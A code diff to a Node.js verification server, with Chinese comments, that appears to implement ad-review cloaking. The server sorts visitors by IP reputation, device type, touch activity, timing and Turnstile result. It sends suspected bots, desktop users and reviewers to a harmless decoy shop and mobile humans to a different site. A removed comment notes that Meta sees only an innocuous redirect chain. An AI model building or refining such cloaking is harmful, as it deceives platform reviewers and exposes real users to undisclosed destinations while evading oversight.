@@ -10,9 +10,10 @@ const PORT = process.env.PORT || 3001;
 // ============================================
 const IPAPI_IS_KEY = process.env.IPAPI_IS_KEY || '';
 const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
-const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET_KEY || '';
+const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
 const REAL_REDIRECT = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
 const FAKE_REDIRECT = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';
+const FLASH_SALE_URL = process.env.FLASH_SALE_URL || 'https://mings.hugediscount.store/flash-sale';
 
 // ============================================
 // 工具函数
@@ -29,27 +30,6 @@ function generateToken(ip) {
   return `${ts}.${ipSig}.${hexSig}`;
 }
 
-// 验证 token
-function verifyToken(token, clientIP) {
-  if (!token || typeof token !== 'string') return false;
-  const parts = token.split('.');
-  if (parts.length !== 3) return false;
-  const [ts, ipSig, hexSig] = parts;
-
-  // 检查时间戳合理性（5分钟内）
-  const age = Date.now() - parseInt(ts);
-  if (isNaN(parseInt(ts)) || age < 0 || age > 5 * 60 * 1000) return false;
-
-  // 重新计算 ipSig
-  const expectedIpSig = crypto.createHmac('sha256', HMAC_SECRET).update(clientIP).digest('hex').substring(0, 32);
-  if (ipSig !== expectedIpSig) return false;
-
-  // 重新计算 hexSig
-  const sigData = `${ts}.${clientIP}`;
-  const expectedHexSig = crypto.createHmac('sha256', HMAC_SECRET).update(sigData).digest('hex');
-  return hexSig === expectedHexSig;
-}
-
 // 生成假token（用于bot，给假token让flash-sale识别）
 function generateFakeToken() {
   return `fake_${crypto.randomBytes(32).toString('hex')}`;
@@ -59,28 +39,24 @@ function generateFakeToken() {
 // IP 类型检测
 // ============================================
 async function checkIPType(ip) {
-  // ipapi.is: 1000 req/day free, 返回 is_datacenter/is_vpn/is_proxy/is_tor
-  // https://ipapi.is/ — API: GET /?q=IP&key=KEY
   if (!IPAPI_IS_KEY) {
-    // 无 key 时跳过检查（开发模式）
     return 'passed';
   }
   try {
-    const url = `https://api.ipapi.is?q=${encodeURIComponent(ip)}&key=${encodeURIComponent(IPAPI_IS_KEY)}`;
+    const url = `https://api.ipapi.is?q=${encodeURIComponent(ip)}&key=${IPAPI_IS_KEY}`;
     const resp = await fetch(url);
     if (!resp.ok) {
       console.log(`[verify] ipapi.is HTTP ${resp.status}`);
-      return 'passed'; // 网络错误时放行
+      return 'passed';
     }
     const data = await resp.json();
-    // 任一为 true → 数据中心/VPN/代理/TOR = bot
     if (data.is_datacenter || data.is_vpn || data.is_proxy || data.is_tor || data.is_abuser) {
       return 'blocked';
     }
     return 'passed';
   } catch (e) {
     console.log('[verify] ipapi.is error:', e.message);
-    return 'passed'; // 网络问题时放行（避免误杀）
+    return 'passed';
   }
 }
 
@@ -88,7 +64,6 @@ async function checkIPType(ip) {
 // Cloudflare Turnstile 验证（强制，不跳过）
 // ============================================
 async function checkTurnstile(token, ip) {
-  // 无 token → 直接判定为机器人（不跳过验证）
   if (!token) return false;
   if (!TURNSTILE_SECRET) {
     console.log('[verify] Turnstile secret not configured, rejecting request');
@@ -104,7 +79,7 @@ async function checkTurnstile(token, ip) {
     return data.success === true;
   } catch (e) {
     console.log('[verify] Turnstile error:', e.message);
-    return false; // 网络错误也拒绝，不放过
+    return false;
   }
 }
 
@@ -137,23 +112,9 @@ async function runChecks(req) {
     answerTimeMs = 0,
     honeypotValue = '',
     turnstileToken = '',
-    answer,          // 提交答案时有，静默验证时无
-    correctAnswer    // 提交答案时有，静默验证时无
+    answer,
+    correctAnswer
   } = req.body || {};
-
-  // 静默验证：页面加载后立即发起（无答案）
-  // 用户提交：有点击动作
-  const isSilent = (answer === undefined && correctAnswer === undefined);
-
-  // L6: 答题时间
-  // 静默验证：前端传 answerTimeMs = Date.now() - pageLoadTime（页面打开到发请求的时间）
-  // 真人：Turnstile渲染需要1-5秒，answerTimeMs 自然 >2000ms
-  // Bot：可能在500ms内完成所有渲染+验证，answerTimeMs < 2000ms → 拦截
-  if (answerTimeMs <= 2000) {
-    return { pass: false, reason: 'too_fast', token: generateFakeToken() };
-  }
-
-  console.log(`[verify] IP=${clientIP} mobile=${isMobile} touch=${touchEventsCount} time=${answerTimeMs}`);
 
   // L1: IP type
   const ipResult = await checkIPType(clientIP);
@@ -161,8 +122,9 @@ async function runChecks(req) {
     return { pass: false, reason: 'ip_blocked', token: generateFakeToken() };
   }
 
-  // L2: 设备类型
+  // L2: 设备类型 — 桌面 = 直接失败，不继续
   if (!isMobile) {
+    console.log(`[verify] desktop → fail immediately`);
     return { pass: false, reason: 'desktop', token: generateFakeToken() };
   }
 
@@ -182,8 +144,7 @@ async function runChecks(req) {
     return { pass: false, reason: 'no_interaction', token: generateFakeToken() };
   }
 
-  // L6: 答题时间（静默验证时前端传 pageLoadTime，用户提交时传用户答题时间）
-  // 阈值 2000ms：Bot 500ms 内完成，真人 Turnstile 渲染 1-5 秒必然 > 2000ms
+  // L6: 答题时间（阈值 2000ms）
   if (answerTimeMs <= 2000) {
     return { pass: false, reason: 'too_fast', token: generateFakeToken() };
   }
@@ -193,31 +154,47 @@ async function runChecks(req) {
 
 // ============================================
 // POST /api/verify
-// 静默检查 + 302 重定向到 flash-sale
-// Meta只看到: POST → 302 → GET /flash-sale
+// 返回 JSON { redirectUrl } — 前端直接 window.location.href 跳转
 // ============================================
 app.post('/api/verify', async (req, res) => {
   const result = await runChecks(req);
 
-  if (result.pass) {
-    console.log('[verify] PASS → redirect to flash-sale?token=REAL');
-    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
-  } else {
-    console.log(`[verify] FAIL (${result.reason}) → redirect to flash-sale?token=FAKE`);
-    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
+  if (!result.pass) {
+    // 骇客/机器人 → 直接跳转假站
+    console.log(`[verify] FAIL (${result.reason}) → ubuy.com.ph`);
+    return res.json({ redirectUrl: FAKE_REDIRECT, pass: false, reason: result.reason });
   }
-});
 
-// ============================================
-// GET /flash-sale
-// 内部转发：由 nginx 代理到 flash-sale 服务
-// ============================================
-app.get('/flash-sale', (req, res) => {
-  const { token } = req.query;
-  if (!token) {
-    return res.redirect(FAKE_REDIRECT);
+  // 真人 → HMAC token + flash-sale 验证 → 真站
+  const clientIP = getClientIP(req);
+  const flashSaleUrl = `${FLASH_SALE_URL}?token=${encodeURIComponent(result.token)}`;
+
+  try {
+    // 静默调用 flash-sale 服务端点，让它验证 HMAC 并返回最终 redirect
+    // 注意：flash-sale 从 x-forwarded-for 取 IP，这里透传原始 IP
+    const resp = await fetch(flashSaleUrl, {
+      method: 'GET',
+      headers: {
+        'X-Forwarded-For': clientIP,
+        'Accept': 'text/html'
+      },
+      redirect: 'manual' // 不自动跟随 302，由我们读取 Location header
+    });
+
+    if (resp.status === 302 || resp.status === 301) {
+      const location = resp.headers.get('location');
+      console.log(`[verify] PASS → real redirect: ${location}`);
+      return res.json({ redirectUrl: location, pass: true, reason: 'verified' });
+    }
+
+    // 非重定向响应（异常情况），默认走真站
+    console.log(`[verify] PASS but flash-sale returned status ${resp.status}`);
+    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });
+
+  } catch (e) {
+    console.log(`[verify] flash-sale call failed: ${e.message} → fallback real redirect`);
+    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });
   }
-  res.redirect(`/flash-sale?token=${token}`);
 });
 
 // ============================================
@@ -231,4 +208,5 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`[verify-api] Running on port ${PORT}`);
   console.log(`[verify-api] IPAPI_IS_KEY: ${IPAPI_IS_KEY ? IPAPI_IS_KEY.substring(0, 8) + '...' : 'NOT SET'}`);
   console.log(`[verify-api] HMAC_SECRET: ${HMAC_SECRET.substring(0, 8)}...`);
+  console.log(`[verify-api] FLASH_SALE_URL: ${FLASH_SALE_URL}`);
 });
